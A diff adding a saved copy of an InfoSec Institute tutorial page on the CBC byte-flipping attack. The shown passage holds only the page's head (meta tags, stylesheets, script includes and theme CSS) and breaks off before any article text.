@@ -1,0 +1,2275 @@
+<!DOCTYPE html>
+<!-- saved from url=(0076)http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/ -->
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" prefix="og: http://ogp.me/ns#" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" slick-uniqueid="3"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+
+
+   
+<style type="text/css">                                                                                                            @font-face {
+  font-family: 'PT Sans';
+  font-style: normal;
+  font-weight: 400;
+  src: local('PT Sans'), local('PTSans-Regular'), url(http://themes.googleusercontent.com/static/fonts/ptsans/v5/jduSEW07_j4sIG_ERxiq4Q.woff) format('woff');
+}
+@font-face {
+  font-family: 'PT Sans';
+  font-style: normal;
+  font-weight: 700;
+  src: local('PT Sans Bold'), local('PTSans-Bold'), url(http://themes.googleusercontent.com/static/fonts/ptsans/v5/HXiERDIZdwFzjXlbcMq7XPesZW2xOQ-xsNqO47m55DA.woff) format('woff');
+}
+@font-face {
+  font-family: 'PT Sans';
+  font-style: italic;
+  font-weight: 400;
+  src: local('PT Sans Italic'), local('PTSans-Italic'), url(http://themes.googleusercontent.com/static/fonts/ptsans/v5/Pq7I38KtY37kAe5aYFKrSA.woff) format('woff');
+}
+@font-face {
+  font-family: 'PT Sans';
+  font-style: italic;
+  font-weight: 700;
+  src: local('PT Sans Bold Italic'), local('PTSans-BoldItalic'), url(http://themes.googleusercontent.com/static/fonts/ptsans/v5/lILlYDvubYemzYzN7GbLkBsxEYwM7FgeyaSgU71cLG0.woff) format('woff');
+}                                                                                                                              @font-face {
+font-family: 'Antic Slab';
+font-style: normal;
+font-weight: 400;
+src: local('Antic Slab'), local('AnticSlab-Regular'), url(http://themes.googleusercontent.com/static/fonts/anticslab/v1/8c9q46CAcsp9TiRX9KLgZBsxEYwM7FgeyaSgU71cLG0.woff) format('woff');
+}                                                                                                                               
+</style>  
+<link rel="stylesheet" href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/Avada-Child-Theme/style.css">
+<!--[if IE]>
+<script type="text/javascript" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/Avada/js/respond.min.js"></script>
+<link rel="stylesheet" href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/Avada/css/ie.css" />
+<![endif]-->
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<link rel="stylesheet" href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/Avada/css/media.css">
+        <style type="text/css">
+    @media only screen and (min-device-width: 768px) and (max-device-width: 1024px) and (orientation: portrait){
+        #wrapper .ei-slider{width:100% !important;}
+    }
+    @media only screen and (min-device-width: 768px) and (max-device-width: 1024px) and (orientation: landscape){
+        #wrapper .ei-slider{width:100% !important;}
+    }
+    </style>
+    
+
+
+
+
+
+
+<!-- This site is optimized with the Yoast WordPress SEO plugin v1.4.19 - http://yoast.com/wordpress/seo/ -->
+<title>CBC Byte Flipping Attack—101 Approach - InfoSec Institute</title>
+<meta name="description" content="As usual, there are some explanations about this attack out there (see references at the end), but some knowledge is required to understand it properly, so">
+<link rel="canonical" href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/CBC Byte Flipping Attack—101 Approach - InfoSec Institute.htm">
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CBC Byte Flipping Attack—101 Approach - InfoSec Institute">
+<meta property="og:description" content="As usual, there are some explanations about this attack out there (see references at the end), but some knowledge is required to understand it properly, so">
+<meta property="og:url" content="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/">
+<meta property="og:site_name" content="InfoSec Institute">
+<meta property="article:tag" content="feature">
+<meta property="article:tag" content="hacking">
+<meta property="article:section" content="Hacking">
+<meta property="article:published_time" content="2013-08-22T07:10:10+00:00">
+<meta property="article:modified_time" content="2013-08-21T10:46:31+00:00">
+<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/CBC-Byte-Flipping08222013.jpg">
+<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip1.png">
+<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip2.png">
+<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip3.jpg">
+<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip4.png">
+<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip5.png">
+<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip6.png">
+<!-- / Yoast WordPress SEO plugin. -->
+
+<link rel="alternate" type="application/rss+xml" title="InfoSec Institute » Feed" href="http://resources.infosecinstitute.com/feed/">
+<link rel="alternate" type="application/rss+xml" title="InfoSec Institute » Comments Feed" href="http://resources.infosecinstitute.com/feed/">
+<link rel="alternate" type="application/rss+xml" title="InfoSec Institute » CBC Byte Flipping Attack—101 Approach Comments Feed" href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/feed/">
+<link rel="stylesheet" id="cptchStylesheet-css" href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/style_wp_before_3.8.css" type="text/css" media="all">
+<link rel="stylesheet" id="digg-digg-css" href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/diggdigg-style.css" type="text/css" media="screen">
+<link rel="stylesheet" id="wooslider-flexslider-css" href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/flexslider.css" type="text/css" media="all">
+<link rel="stylesheet" id="wooslider-common-css" href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="enlighter-local-css" href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/EnlighterJS.yui.css" type="text/css" media="all">
+<link rel="stylesheet" id="ubermenu-basic-css" href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/basic.css" type="text/css" media="all">
+<link rel="stylesheet" id="ubermenu-trans-black-css" href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/trans_black.css" type="text/css" media="all">
+<div class="fit-vids-style">­<style>         .fluid-width-video-wrapper {        width: 100%;                     position: relative;              padding: 0;                      }                                   .fluid-width-video-wrapper iframe,  .fluid-width-video-wrapper object,  .fluid-width-video-wrapper embed {  position: absolute;              top: 0;                          left: 0;                         width: 100%;                     height: 100%;                    }                                   </style></div><script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/pd.js"></script><script src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/cb=gapi.loaded_1" async=""></script><script src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/cb=gapi.loaded_0" async=""></script><script type="text/javascript" async="" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/ga.js"></script><script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/debounce.js"></script><style type="text/css"></style><style type="text/css"></style>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery-migrate.min.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/strx-magic-floating-sidebar-maker.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.flexslider-min.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.fitvids.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.easing.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.lazyload.min.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/mootools-yui-compressed.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/EnlighterJS.yui.js"></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://resources.infosecinstitute.com/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://resources.infosecinstitute.com/wp-includes/wlwmanifest.xml"> 
+<link rel="shortlink" href="http://resources.infosecinstitute.com/?p=20700">
+<link rel="image_src" href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/082113_1459_CBCByteFlip1.png"><script type="text/javascript">
+window.addEvent('domready', function(){
+new EnlighterJS.Helper($$('pre.EnlighterJSRAW'), {
+language: 'standard',
+theme: 'git',
+indent: -1,
+compiler: 'List',
+altLines: 'hoverEnabled'
+});});</script>
+<style type="text/css">
+img.lazy { display: none; }
+</style>
+<style type="text/css" media="screen">body{position:relative}#dynamic-to-top{display:none;overflow:hidden;width:auto;z-index:90;position:fixed;bottom:20px;right:20px;top:auto;left:auto;font-family:sans-serif;font-size:1em;color:#fff;text-decoration:none;text-shadow:0 1px 0 #333;font-weight:bold;padding:4px 40px;border:0px solid #000;background:#111;-webkit-background-origin:border;-moz-background-origin:border;-icab-background-origin:border;-khtml-background-origin:border;-o-background-origin:border;background-origin:border;-webkit-background-clip:padding-box;-moz-background-clip:padding-box;-icab-background-clip:padding-box;-khtml-background-clip:padding-box;-o-background-clip:padding-box;background-clip:padding-box;-webkit-border-radius:9px;-moz-border-radius:9px;-icab-border-radius:9px;-khtml-border-radius:9px;border-radius:9px}#dynamic-to-top:hover{background:#4d5858;background:#111 -webkit-gradient( linear, 0% 0%, 0% 100%, from( rgba( 255, 255, 255, .2 ) ), to( rgba( 0, 0, 0, 0 ) ) );background:#111 -webkit-linear-gradient( top, rgba( 255, 255, 255, .2 ), rgba( 0, 0, 0, 0 ) );background:#111 -khtml-linear-gradient( top, rgba( 255, 255, 255, .2 ), rgba( 0, 0, 0, 0 ) );background:#111 -moz-linear-gradient( top, rgba( 255, 255, 255, .2 ), rgba( 0, 0, 0, 0 ) );background:#111 -o-linear-gradient( top, rgba( 255, 255, 255, .2 ), rgba( 0, 0, 0, 0 ) );background:#111 -ms-linear-gradient( top, rgba( 255, 255, 255, .2 ), rgba( 0, 0, 0, 0 ) );background:#111 -icab-linear-gradient( top, rgba( 255, 255, 255, .2 ), rgba( 0, 0, 0, 0 ) );background:#111 linear-gradient( top, rgba( 255, 255, 255, .2 ), rgba( 0, 0, 0, 0 ) );cursor:pointer}#dynamic-to-top:active{background:#111;background:#111 -webkit-gradient( linear, 0% 0%, 0% 100%, from( rgba( 0, 0, 0, .3 ) ), to( rgba( 0, 0, 0, 0 ) ) );background:#111 -webkit-linear-gradient( top, rgba( 0, 0, 0, .1 ), rgba( 0, 0, 0, 0 ) );background:#111 -moz-linear-gradient( top, rgba( 0, 0, 0, .1 ), rgba( 0, 0, 0, 0 ) );background:#111 -khtml-linear-gradient( top, rgba( 0, 0, 0, .1 ), rgba( 0, 0, 0, 0 ) );background:#111 -o-linear-gradient( top, rgba( 0, 0, 0, .1 ), rgba( 0, 0, 0, 0 ) );background:#111 -ms-linear-gradient( top, rgba( 0, 0, 0, .1 ), rgba( 0, 0, 0, 0 ) );background:#111 -icab-linear-gradient( top, rgba( 0, 0, 0, .1 ), rgba( 0, 0, 0, 0 ) );background:#111 linear-gradient( top, rgba( 0, 0, 0, .1 ), rgba( 0, 0, 0, 0 ) )}#dynamic-to-top,#dynamic-to-top:active,#dynamic-to-top:focus,#dynamic-to-top:hover{outline:none}#dynamic-to-top span{display:block;overflow:hidden;width:14px;height:12px;background:url( http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/dynamic-to-top/css/images/up.png )no-repeat center center}</style><link rel="stylesheet" type="text/css" href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/shCore.css"><link rel="stylesheet" type="text/css" href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/shThemeDefault.css"><style type="text/css" id="syntaxhighlighteranchor"></style>
+
+<!-- UberMenu CSS - Controlled through UberMenu Options Panel 
+================================================================ -->
+<style type="text/css" id="ubermenu-style-generator-css">
+/* Image Text Padding */
+#megaMenu .ss-nav-menu-with-img > a > .wpmega-link-title, #megaMenu .ss-nav-menu-with-img > a > .wpmega-link-description, #megaMenu .ss-nav-menu-with-img > a > .wpmega-item-description, #megaMenu .ss-nav-menu-with-img > span.um-anchoremulator > .wpmega-link-title, #megaMenu .ss-nav-menu-with-img > span.um-anchoremulator > .wpmega-link-description, #megaMenu .ss-nav-menu-with-img > span.um-anchoremulator > .wpmega-item-description{
+  padding-left: 23px;
+}
+
+
+/* Custom Tweaks - UberMenu Style Configuration Settings */
+.megaMenu li{padding:0 35px 0 0}.megaMenu li a{font-family:"Antic Slab",Arial,Helvetica,sans-serif!important;border-top-color:white!important}.megaMenu li.wpf_gray a{color:#747474!important;border-left:0!important}.megaMenu li.wpf_green a{color:#59b200!important}.megaMenu li.wpf_blue a{color:#014693!important}.megaMenu li a:hover{background:#464141}#megaMenu ul.megaMenu li.menu-item.ss-nav-menu-mega>a:after{border-top-color:white!important}.sub-menu{background:#353535}
+#megaMenu ul.sub-menu {background: #424242 !important;}
+#megaMenu ul.megaMenu > li.menu-item > .wpmega-nonlink {padding: 0;}
+.wpf_green.wpf_hover:hover { background: none repeat scroll 0 0 #424242 !important;}
+.sub-menu li {width: 42%;}
+.sub-menu li {    margin-bottom: 0 !important;    padding-bottom: 0 !important;}
+.wpf_green.wpf_hover:hover a span {color: #747474 !important;}
+.wpf_green.wpf_hover ul.sub-menu li a span {    color: #009BDE !important;}
+.wpf_green.wpf_hover ul.sub-menu li ul li a span {    color: #F5F5F5 !important;}
+.wpf_green.wpf_hover:hover ul.sub-menu li a span {    color: #009BDE !important;}
+.wpf_green.wpf_hover:hover ul.sub-menu li ul li a span {    color: #F5F5F5 !important;}
+.wpmega-nonlink{
+position: absolute;
+width: 0;
+font-weight: bold;
+top: 260px;
+z-index: 501;
+left: 25px;
+display: none;
+transition: all 2s ease-in;-moz-transition: all 2s ease-in;
+-webkit-transition: all 2s ease-in;
+}
+.wpf_green.wpf_hover:hover .wpmega-nonlink{display: block;width: inherit;}
+.sub-menu.sub-menu-1 li:first-child ul {
+margin-bottom: 50px !important;
+}
+ul.sub-menu ul li:hover {
+background: #ccc !important;
+padding-left: 10px !important;
+}
+ul.sub-menu ul li {
+padding-left: 10px !important;
+}	
+</style>
+<!-- end UberMenu CSS -->
+		
+			<!--[if IE 8]>
+<script type="text/javascript">
+jQuery(document).ready(function() {
+var imgs, i, w;
+var imgs = document.getElementsByTagName( 'img' );
+for( i = 0; i < imgs.length; i++ ) {
+    w = imgs[i].getAttribute( 'width' );
+    if ( 615 < w ) {
+        imgs[i].removeAttribute( 'width' );
+        imgs[i].removeAttribute( 'height' );
+    }
+}
+});
+</script>
+<![endif]-->
+<style type="text/css">
+a:hover,
+#nav ul .current_page_item a, #nav ul .current-menu-item a, #nav ul > .current-menu-parent a,
+.footer-area ul li a:hover,
+.side-nav li.current_page_item a,
+.portfolio-tabs li.active a, .faq-tabs li.active a,
+.project-content .project-info .project-info-box a:hover,
+.about-author .title a,
+span.dropcap,.footer-area a:hover,.copyright a:hover,
+#sidebar .widget_categories li a:hover,
+#main .post h2 a:hover,
+#sidebar .widget li a:hover,
+#nav ul a:hover{
+    color:#a0ce4e !important;
+}
+#nav ul .current_page_item a, #nav ul .current-menu-item a, #nav ul > .current-menu-parent a,
+#nav ul ul,#nav li.current-menu-ancestor a,
+.reading-box,
+.portfolio-tabs li.active a, .faq-tabs li.active a,
+.tab-holder .tabs li.active a,
+.post-content blockquote,
+.progress-bar-content,
+.pagination .current,
+.pagination a.inactive:hover,
+#nav ul a:hover{
+    border-color:#a0ce4e !important;
+}
+.side-nav li.current_page_item a{
+    border-right-color:#a0ce4e !important;	
+}
+.header-v2 .header-social, .header-v3 .header-social, .header-v4 .header-social,.header-v5 .header-social{
+    border-top-color:#a0ce4e !important;	
+}
+h5.toggle.active span.arrow,
+.post-content ul.arrow li:before,
+.progress-bar-content,
+.pagination .current,
+.header-v3 .header-social,.header-v4 .header-social,.header-v5 .header-social{
+    background-color:#a0ce4e !important;
+}
+
+.sep-boxed-pricing ul li.title-row{
+    background-color:#92C563 !important;
+    border-color:#92C563 !important;
+}
+.pricing-row .exact_price, .pricing-row sup{
+    color:#92C563 !important;
+}
+.image .image-extras{
+    background-image: linear-gradient(top, #D1E990 0%, #AAD75B 100%);
+    background-image: -o-linear-gradient(top, #D1E990 0%, #AAD75B 100%);
+    background-image: -moz-linear-gradient(top, #D1E990 0%, #AAD75B 100%);
+    background-image: -webkit-linear-gradient(top, #D1E990 0%, #AAD75B 100%);
+    background-image: -ms-linear-gradient(top, #D1E990 0%, #AAD75B 100%);
+
+    background-image: -webkit-gradient(
+        linear,
+        left top,
+        left bottom,
+        color-stop(0, #D1E990),
+        color-stop(1, #AAD75B)
+    );
+
+    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#D1E990', endColorstr='#AAD75B');
+}
+.no-cssgradients .image .image-extras{
+    background:#D1E990;
+}
+#main .reading-box .button,
+#main .continue.button,
+#main .portfolio-one .button,
+#main .comment-submit,
+.button.default{
+    color: #54770f !important;
+    background-image: linear-gradient(top, #D1E990 0%, #AAD75B 100%);
+    background-image: -o-linear-gradient(top, #D1E990 0%, #AAD75B 100%);
+    background-image: -moz-linear-gradient(top, #D1E990 0%, #AAD75B 100%);
+    background-image: -webkit-linear-gradient(top, #D1E990 0%, #AAD75B 100%);
+    background-image: -ms-linear-gradient(top, #D1E990 0%, #AAD75B 100%);
+
+    background-image: -webkit-gradient(
+        linear,
+        left top,
+        left bottom,
+        color-stop(0, #D1E990),
+        color-stop(1, #AAD75B)
+    );
+    border:1px solid #AAD75B;
+
+    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#D1E990', endColorstr='#AAD75B');
+}
+.no-cssgradients #main .reading-box .button,
+.no-cssgradients #main .continue.button,
+.no-cssgradients #main .portfolio-one .button,
+.no-cssgradients #main .comment-submit,
+.no-cssgradients .button.default{
+    background:#D1E990;
+}
+#main .reading-box .button:hover,
+#main .continue.button:hover,
+#main .portfolio-one .button:hover,
+#main .comment-submit:hover,
+.button.default:hover{
+    color: #54770f !important;
+    background-image: linear-gradient(top, #AAD75B 0%, #D1E990 100%);
+    background-image: -o-linear-gradient(top, #AAD75B 0%, #D1E990 100%);
+    background-image: -moz-linear-gradient(top, #AAD75B 0%, #D1E990 100%);
+    background-image: -webkit-linear-gradient(top, #AAD75B 0%, #D1E990 100%);
+    background-image: -ms-linear-gradient(top, #AAD75B 0%, #D1E990 100%);
+
+    background-image: -webkit-gradient(
+        linear,
+        left top,
+        left bottom,
+        color-stop(0, #AAD75B),
+        color-stop(1, #D1E990)
+    );
+    border:1px solid #AAD75B;
+
+    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#AAD75B', endColorstr='#D1E990');
+}
+.no-cssgradients #main .reading-box .button:hover,
+.no-cssgradients #main .continue.button:hover,
+.no-cssgradients #main .portfolio-one .button:hover,
+.no-cssgradients #main .comment-submit:hover,
+.no-cssgradients .button.default{
+    background:#AAD75B;
+}
+
+
+
+.page-title-container{
+    background-color:#F6F6F6;
+}
+
+body,#nav ul li ul li a,
+.more,
+.avada-container h3,
+.meta .date,
+.review blockquote q,
+.review blockquote div strong,
+.image .image-extras .image-extras-content h4,
+.project-content .project-info h4,
+.post-content blockquote,
+.button.large,
+.button.small,
+.ei-title h3{
+    font-family:"PT Sans", Arial, Helvetica, sans-serif !important;
+}
+.avada-container h3,
+.review blockquote div strong,
+.footer-area  h3,
+.button.large,
+.button.small{
+    font-weight:bold;
+}
+.meta .date,
+.review blockquote q,
+.post-content blockquote{
+    font-style:italic;
+}
+
+
+#nav,
+.side-nav li a{
+    font-family:"Antic Slab", Arial, Helvetica, sans-serif !important;
+}
+
+
+#main .reading-box h2,
+#main h2,
+.page-title h1,
+.image .image-extras .image-extras-content h3,
+#main .post h2,
+#sidebar .widget h3,
+.tab-holder .tabs li a,
+.share-box h4,
+.project-content h3,
+h5.toggle a,
+.full-boxed-pricing ul li.title-row,
+.full-boxed-pricing ul li.pricing-row,
+.sep-boxed-pricing ul li.title-row,
+.sep-boxed-pricing ul li.pricing-row,
+.person-author-wrapper,
+.post-content h1, .post-content h2, .post-content h3, .post-content h4, .post-content h5, .post-content h6,
+.ei-title h2, #header .tagline{
+    font-family:"Antic Slab", Arial, Helvetica, sans-serif !important;
+}
+
+
+.footer-area  h3{
+    font-family:"Antic Slab", Arial, Helvetica, sans-serif !important;
+}
+
+body,#sidebar .slide-excerpt h2, .footer-area .slide-excerpt h2{
+    font-size:13px;
+        line-height:20px;
+}
+.project-content .project-info h4{
+    font-size:13px !important;
+        line-height:20px !important;
+}
+
+#nav{font-size:13px !important;}
+
+.header-social *{font-size:12px !important;}
+
+.page-title ul li,page-title ul li a{font-size:10px !important;}
+
+.side-nav li a{font-size:14px !important;}
+
+#sidebar .widget h3{font-size:13px !important;}
+
+.footer-area h3{font-size:13px !important;}
+
+.copyright{font-size:12px !important;}
+
+#header .avada-row, #main .avada-row, .footer-area .avada-row, #footer .avada-row{ max-width:940px; }
+
+.post-content h1{
+    font-size:32px !important;
+        line-height:48px !important;
+}
+
+.post-content h2,.title h2,#main .post-content .title h2,.page-title h1,#main .post h2 a{
+    font-size:18px !important;
+        line-height:27px !important;
+}
+
+.post-content h3,.project-content h3,#header .tagline{
+    font-size:16px !important;
+        line-height:24px !important;
+}
+
+.post-content h4{
+    font-size:13px !important;
+        line-height:20px !important;
+}
+h5.toggle a,.tab-holder .tabs li a,.share-box h4,.person-author-wrapper{
+    font-size:13px !important;
+}
+
+.post-content h5{
+    font-size:12px !important;
+        line-height:18px !important;
+}
+
+.post-content h6{
+    font-size:11px !important;
+        line-height:17px !important;
+}
+
+.ei-title h2{
+    font-size:42px !important;
+        line-height:63px !important;
+}
+
+.ei-title h3{
+    font-size:20px !important;
+        line-height:30px !important;
+}
+
+body,.post .post-content,.post-content blockquote,.tab-holder .news-list li .post-holder .meta,#sidebar #jtwt,.meta,.review blockquote div,.search input,.project-content .project-info h4{color:#747474 !important;}
+
+.post-content h1, .post-content h2, .post-content h3,
+.post-content h4, .post-content h5, .post-content h6,
+#sidebar .widget h3,h5.toggle a, .tab-holder .tabs li a,
+.page-title h1,.full-boxed-pricing ul li.title-row,
+.image .image-extras .image-extras-content h3,.project-content .project-info h4,.project-content h3,.share-box h4,.title h2,.person-author-wrapper,#sidebar .tab-holder .tabs li a,#header .tagline{
+    color:#333333 !important;
+}
+
+body a,.project-content .project-info .project-info-box a,#sidebar .widget li a, #sidebar .widget .recentcomments, #sidebar .widget_categories li, #main .post h2 a{color:#333333 !important;}
+
+.page-title ul li,.page-title ul li a{color:#333333 !important;}
+
+.footer-area h3{color:#DDDDDD !important;}
+
+.footer-area,.footer-area #jtwt,.copyright{color:#8C8989 !important;}
+
+.footer-area a,.copyright a{color:#BFBFBF !important;}
+
+#nav ul a,.side-nav li a{color:#333333 !important;}
+
+#nav ul ul{background-color:#edebeb;}
+
+#wrapper #nav ul li ul li a,.side-nav li li a,.side-nav li.current_page_item li a{color:#333333 !important;}
+
+.ei-title h2{color:#333333 !important;}
+
+.ei-title h3{color:#747474 !important;}
+
+#wrapper .header-social *{color:#ffffff !important;}
+#wrapper .header-social .menu li{border-color:#ffffff !important;}
+
+
+
+.main-flex .flex-control-nav{display:none !important;}
+
+@media only screen and (max-width: 940px){
+    .breadcrumbs{display:none !important;}
+}
+@media only screen and (min-device-width: 768px) and (max-device-width: 1024px) and (orientation: portrait){
+    .breadcrumbs{display:none !important;}
+}
+
+
+#nav > li > a,#nav li.current-menu-ancestor a{height:83px;line-height:83px;}
+#nav > li > a,#nav li.current-menu-ancestor a{height:83px;line-height:83px;}
+
+#nav ul ul{top:86px;}
+
+
+@media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and (min-device-pixel-ratio: 2) {
+    .page-title-container {
+        background-image: url() !important;
+        -webkit-background-size:cover;
+           -moz-background-size:cover;
+             -o-background-size:cover;
+                background-size:cover;
+    }
+}
+
+.ei-slider{width:100% !important;}
+
+.ei-slider{height:400px !important;}
+
+.isotope .isotope-item {
+  -webkit-transition-property: top, left, opacity;
+     -moz-transition-property: top, left, opacity;
+      -ms-transition-property: top, left, opacity;
+       -o-transition-property: top, left, opacity;
+          transition-property: top, left, opacity;
+}
+.header-social .sep{float:left}#nav ul li.menu-item a{font-weight:bold}.col .heading{margin:0}#blue_box_boot h2.blue{line-height:20px!important}h2.blue{width:49%!important}.tagline-shadow{background:transparent url(.../images/shadow-top.png) no-repeat top center;height:42px;width:100%;position:absolute;bottom:-42px;left:0;-webkit-background-size:cover;-moz-background-size:cover;-o-background-size:cover;background-size:cover}.demo-sep{clear:both}.sep-single{height:1px;background-color:#e7e6e6}.sep-double{height:6px;border-top:1px solid #e7e6e6;border-bottom:1px solid #e7e6e6}.sep-dotted{border-bottom:2px dotted #e7e6e6}.sep-dashed{border-bottom:2px dashed #e7e6e6}.sep-shadow{background:transparent url(images/sep-shadow.png) no-repeat top center;height:7px;width:100%}#text-7 .textwidget{background-color:#f6f3f3!important;padding:0 10px}.wpf_author_name_widget{float:left;width:75%}input[type="email"]{width:60%}.single_page_columns{margin:0!important}.news_letter_signup{margin:10px 0}.news_letter_signup .button{margin-top:0!important}.greensidebar{background:none repeat scroll 0 0 hsl(90,100%,35%);padding:18px 0;border-radius:8px;box-shadow:4px 4px 1px 1px hsl(0,0%,93%)}.green_title_bar{background:none repeat scroll 0 0 hsl(89,52%,66%);width:100%;text-align:center}#sidebar .greensidebar ul li a{background:none repeat scroll 0 0 transparent!important;border:medium none!important;color:white!important;display:list-item!important;padding:0!important;text-decoration:underline}.bluesidebar{background:#0c77bf;padding:18px 0;border-radius:8px;box-shadow:4px 4px 1px 1px hsl(0,0%,93%)}.blue_title_bar{background:#79cded;width:100%;text-align:center}#sidebar .bluesidebar ul li a{background:none repeat scroll 0 0 transparent!important;border:medium none!important;color:white!important;display:list-item!important;padding:0!important;text-decoration:underline}#sidebar .greensidebar ul,#sidebar .bluesidebar ul,#sidebar .greensidebar .sidebarbut,#sidebar .bluesidebar .sidebarbut{margin-left:30px;margin-top:5px}img,object(max-width:100%!important;) #nav ul a,.side-nav li a{color:#333}#nav ul li.wpf_gray a,.side-nav li.wpf_gray a{color:#8a8a7b!important}#nav ul li.wpf_green a,.side-nav li.wpf_green a{color:#59b200!important}#nav ul li.wpf_blue a,.side-nav li.wpf_blue a{color:#014693!important}.header-v3 #header{border-bottom:none}.header-v3 .header-social{background-color:#019cdc!important;line-height:25px}.header-social{border:none}.portfolio-tabs,.faq-tabs{margin-bottom:6px!important}.page-template-mini-course-two-column-php .portfolio-content h2{font-size:21px;line-height:190%!important}.page-template-mini-course-two-column-php .portfolio-content h4{margin-bottom:15px;font-size:.93em!important}.page-template-mini-course-two-column-php .portfolio-content h4 a{background:#019cdc;padding:6px 15px;color:white!important;text-transform:uppercase;font-weight:bold}.page-template-mini-course-two-column-php .portfolio-content h4 a:hover{color:wheat!important}.page-template-mini-course-two-column-php .portfolio-content h4 a.vid_time{background:#ffd24d;color:#b28500!important;font-weight:bold}.page-template-mini-course-two-column-php .portfolio-content .boxfile{background:url(../images/labs.png) left center no-repeat;padding:10px 40px}.page-template-mini-course-two-column-php .portfolio-content .about-author{background:#f3efee;padding:12px}.page-template-mini-course-two-column-php .portfolio-content .about-author .description{margin-top:-10px}.page-template-mini-downloads-two-column-php .portfolio-content .boxfile{background:url(../images/labs.png) left center no-repeat;padding:10px 40px}h5 a.boxfile{background:url(http://infosec.staging.wpengine.com/wp-content/uploads/PDF-download-icon.png) left center no-repeat;padding:10px 40px;background-size:contain}#space{padding:5px 100px;background-color:#8a8a7b;font-weight:bold;margin:0;height:16px;float:left;line-height:15px}#free{padding:5px 140px;background-color:#59b200;font-weight:bold;margin:0;height:16px;float:left;line-height:15px}#boot_camps{padding:5px 80px;background-color:#014693;font-weight:bold;margin:0;height:16px;float:left;line-height:15px}.header-social .social-networks{width:auto;margin-top:5px}.header-social .alignleft{height:25px;margin-right:0!important}.social-networks li{margin:0 0 0 5px}#main{padding-top:10px!important}#main .reading-box{margin-bottom:40px!important;padding:10px 25px;position:relative}#main .reading-box h1{font-size:25px;color:#c0c0c0;line-height:100%;margin:10px 0}#main .reading-box .button{cursor:pointer;margin-top:15px}#main .reading-box .button.darkgray{background-image:-moz-linear-gradient(center top,#c0c0c0 0,#9e9e9e 100%);border:1px solid #434c50;color:#434c50!important}#main .reading-box .button.darkgray:hover{background-image:-moz-linear-gradient(center top,#9e9e9e 0,#c0c0c0 100%);border:1px solid #434c50;color:#434c50!important}#main .reading-box .button.blue{color:#1172c1!important;background-image:linear-gradient(top,#b5e0f7 0,#76c7f1 100%);background-image:-o-linear-gradient(top,#b5e0f7 0,#76c7f1 